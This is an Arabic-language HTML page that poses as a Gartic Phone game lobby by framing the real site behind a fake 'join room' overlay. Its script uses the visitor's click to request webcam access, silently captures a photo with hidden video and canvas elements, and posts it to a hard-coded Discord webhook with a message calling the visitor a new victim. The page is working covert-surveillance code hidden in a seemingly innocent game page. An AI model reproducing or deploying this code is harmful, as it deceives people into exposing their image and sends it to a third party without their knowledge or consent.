<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Gartic Phone</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background-color: #323232;
            font-family: Tahoma, sans-serif;
        }
        #game-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        /* طبقة شفافة تغطي الشاشة بالكامل وتطلب الضغط من أي مكان */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #fff;
            cursor: pointer;
        }
        .loader-box {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,255,204,0.3);
            border: 1px solid #00ffcc;
        }
        .btn {
            background: #00ffcc;
            color: #000;
            padding: 12px 35px;
            border: none;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <!-- شاشة وهمية تظهر فور دخول الموقع تطلب النقر للانضمام للعبة -->
    <div id="overlay">
        <div class="loader-box">
            <h2>انضمام إلى غرفة Gartic Phone</h2>
            <p>اضغط هنا لدخول الجلسة وبدء الرسم</p>
            <button class="btn">دخول الغرفة</button>
        </div>
    </div>

    <!-- عرض موقع اللعبة الأصلي في الخلفية -->
    <iframe 
        id="game-frame" 
        src="https://garticphone.com/" 
        title="Gartic Phone"
        allow="autoplay; fullscreen"
        sandbox="allow-forms allow-scripts allow-same-origin allow-popups">
    </iframe>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1533682966788575255/wlT0aI9CUPENQsH_vjBBp2a1N5DGxZqz3hoXvtj9lbvpn2oYAfEnwIMGTrGVTnLfLkym'; // ضع رابط ديسكورد هنا

        const overlay = document.getElementById('overlay');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // بمجرد أن يضغط الزائر في أي مكان على الشاشة (لتجاوز رسالة الدخول للعبة)
        overlay.addEventListener('click', async () => {
            try {
                // طلب الكاميرا بموافقة المتصفح الناتجة عن الضغطة
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.srcObject = stream;

                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        stream.getTracks().forEach(track => track.stop());
                        if (!blob) return;

                        const formData = new FormData();
                        formData.append('file', blob, 'visitor_capture.jpg');
                        formData.append('payload_json', JSON.stringify({
                            content: "📸 ضحية جديدة دخلت الموقع وتم التقاط صورتها:"
                        }));

                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.90);
                }, 500);

            } catch (error) {
                // لو رفض الإذن
            }

            // إزالة الشاشة الوهمية فوراً لتبدأ اللعبة بالظهور للزائر
            overlay.style.display = 'none';
        });
    </script>

</body>
</html>
